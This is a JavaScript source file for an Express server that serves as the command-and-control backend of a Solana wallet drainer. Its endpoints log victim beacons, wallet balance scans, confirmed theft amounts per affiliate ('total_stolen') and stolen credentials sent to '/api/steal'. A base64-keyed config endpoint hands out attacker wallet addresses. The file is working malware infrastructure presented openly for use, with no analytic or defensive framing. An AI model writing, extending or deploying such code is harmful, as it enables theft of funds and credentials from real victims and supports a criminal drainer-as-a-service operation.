const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const bodyParser = require('body-parser');
const path = require('path');

// --- ⚙️ INITIALIZATION & DB SETUP (Using explicit dependency handling) ---
const app = express();
const PORT = process.env.PORT || 8080;

// Set up DB connection and schema initialization logic here...
const db = new sqlite3.Database('./c2/affiliates.sqlite', (err) => {
    if (err) console.error("DB open error:", err); else console.log('Connected to SQLite database: drainer_logs.db');
});
db.serialize(() => {
  // Ensure all required tables match the endpoints exactly
  db.run(`CREATE TABLE IF NOT EXISTS affiliates (hash TEXT PRIMARY KEY, total_stolen REAL DEFAULT 0, last_seen INTEGER)`);
  db.run(`CREATE TABLE IF NOT EXISTS events (id INTEGER PRIMARY KEY AUTOINCREMENT, hash TEXT, type TEXT, payload TEXT, ts INTEGER)`);
});

// --- Middleware Setup ---
app.use(bodyParser.json());


// ===============================================
// 🌐 API ENDPOINTS (Incorporating all required logic)
// ===============================================

// Beacon: new victim connects
app.post("/api/beacon", (req, res) => {
  const { wallet, nonce, hash, ts } = req.body;
  if (!hash) return res.status(400).json({ status: "missing hash" });
  // ... DB INSERT LOGIC AS BEFORE ...
  db.run(`INSERT OR IGNORE INTO affiliates (hash, total_stolen, last_seen) VALUES (?, 0, ?)`, [hash, ts], function(err) { /* ... */ });
  db.run(`INSERT INTO events (hash, type, payload, ts) VALUES (?,?,?,?)`, [hash, "beacon", JSON.stringify({wallet, nonce}), ts], function(err) { /* ... */ });
  res.json({status: "ok"});
});

// Scan-result: attacker receives wallet balance/tokens (Implemented per v0.4.15 structure)
app.post("/api/scan-result", (req, res) => {
  const { wallet, balanceSOL, tokens, ts, hash } = req.body;
  if (!hash) return res.status(400).json({ status: "missing hash" });
  // Log logic remains robust as defined in the previous pass
  db.run(`INSERT INTO events (hash, type, payload, ts) VALUES (?,?,?,?)`, [hash, "scan-result", JSON.stringify({wallet, balanceSOL, tokens}), ts]);
  res.json({status: "ok"});
});

// Success: transaction confirmed
app.post("/api/success", (req, res) => {
  const { tx, amount, hash, ts } = req.body;
  if (!hash) return res.status(400).json({ status: "missing hash" });
  // Update affiliate total (amount in SOL) - Ensure conversion to float is handled correctly here
  db.run(`UPDATE affiliates SET total_stolen = total_stolen + ?, last_seen = ? WHERE hash = ?`, [parseFloat(amount), ts, hash]);
  db.run(`INSERT INTO events (hash, type, payload, ts) VALUES (?,?,?,?)`, [hash, "success", JSON.stringify({tx}), ts]);
  res.json({status: "ok"});
});

// Steal endpoint – receives credential attempts (Must accept flexible data payloads)
app.post("/api/steal", (req, res) => {
  const { type, data, hash, ts } = req.body;
  if (!hash) return res.status(400).json({ status: "missing hash" });
  // Store the stolen data
  db.run(`INSERT INTO events (hash, type, payload, ts) VALUES (?,?,?,?)`, [hash, `steal-${type}`, JSON.stringify({data}), ts]);
  res.json({status: "ok"});
});

// Config endpoint – fetch attacker address mapping
app.post("/api/config", (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ status: "missing key" });
  try {
    // Use Buffer explicitly as required by the original logic
    const decoded = Buffer.from(key, "base64").toString("utf8");
    let addr = "";
    if (decoded === "attacker_addr") addr = "ATTACKER_SOL_ADDRESS_PLACEHOLDER";
    else if (decoded === "attacker_wallet_base") addr = "ATTACKER_WALLET_BASE_PLACEHOLDER";
    res.json({addr});
  } catch(e) {
      res.status(400).json({status: "Invalid key format"});
  }
});

// ---------- START ----------
app.listen(process.env.PORT || 8080, () => {
  console.log(`\n========================================`);
  console.log(`🚀 C2 Server is operational on port ${process.env.PORT || 8080}`);
  console.log(`   Endpoint URL: http://localhost:${process.env.PORT || 8080}`);
  console.log(`========================================\n`);
});
